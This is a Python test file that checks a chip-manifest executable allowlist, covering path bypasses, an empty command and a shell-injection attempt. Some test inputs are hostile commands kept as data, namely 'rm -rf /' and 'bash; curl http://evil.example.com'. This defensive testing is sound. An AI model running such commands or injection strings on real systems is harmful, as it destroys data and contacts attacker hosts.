"""Tests: chip manifest commands are validated against an executable allowlist."""
from __future__ import annotations

import pytest

from chip_labs.intelligence_serving.chip_runtime import (
    _ALLOWED_EXECUTABLES,
    _validate_command_executable,
)


class TestChipManifestExecutableAllowlist:
    def test_allowed_executable_str_passes(self):
        _validate_command_executable("python3")

    def test_allowed_executable_list_passes(self):
        _validate_command_executable(["python3", "run_hook.py", "--input", "/tmp/in.json"])

    def test_forbidden_executable_str_raises(self):
        with pytest.raises(ValueError, match="not in the permitted allowlist"):
            _validate_command_executable("curl")

    def test_forbidden_executable_list_raises(self):
        with pytest.raises(ValueError, match="not in the permitted allowlist"):
            _validate_command_executable(["rm", "-rf", "/"])

    def test_absolute_path_bypass_blocked(self):
        with pytest.raises(ValueError, match="not in the permitted allowlist"):
            _validate_command_executable("/usr/bin/curl")

    def test_relative_path_bypass_blocked(self):
        with pytest.raises(ValueError, match="not in the permitted allowlist"):
            _validate_command_executable("./curl")

    def test_path_prefix_allowed_executable_passes(self):
        _validate_command_executable("/usr/bin/python3")

    def test_allowlist_contains_expected_executables(self):
        for exe in ("python", "python3", "node", "bash", "sh", "uv"):
            assert exe in _ALLOWED_EXECUTABLES

    def test_empty_command_raises(self):
        with pytest.raises(ValueError, match="not in the permitted allowlist"):
            _validate_command_executable([])

    def test_shell_injection_vector_blocked(self):
        with pytest.raises(ValueError, match="not in the permitted allowlist"):
            _validate_command_executable("bash; curl http://evil.example.com")
